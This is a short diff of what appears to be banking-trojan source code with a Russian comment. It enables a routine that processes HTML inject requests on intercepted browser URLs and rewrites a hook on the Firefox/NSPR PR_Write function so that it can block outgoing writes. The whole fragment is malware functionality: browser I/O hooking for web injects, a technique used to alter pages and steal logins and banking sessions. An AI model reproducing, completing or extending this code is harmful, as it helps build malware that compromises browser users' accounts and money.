@@ -521,8 +521,8 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len, bool &CancelRequest )
 		if (Request->URL == NULL) return false;
 
 		// Обрабатываем взаимодействие со скриптами инжектов
-//		ProcessHTMLInjectRequest(Request->URL, &CancelRequest);
-//		if (CancelRequest) return false;
+		ProcessHTMLInjectRequest(Request->URL, &CancelRequest);
+		if (CancelRequest) return false;
 
 
 
@@ -842,9 +842,9 @@ PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 		}
 	}
 
-	PRInt32 Result = PR_WriteReal(fd, buf, amount);
-	if (CancelRequest)
-		CancelRequest = false;
+    PRInt32 Result = -1;
+	if (!CancelRequest)
+		Result = PR_WriteReal(fd, buf, amount);
 	return Result;
 }
 //---------------------------------------------------------------------------
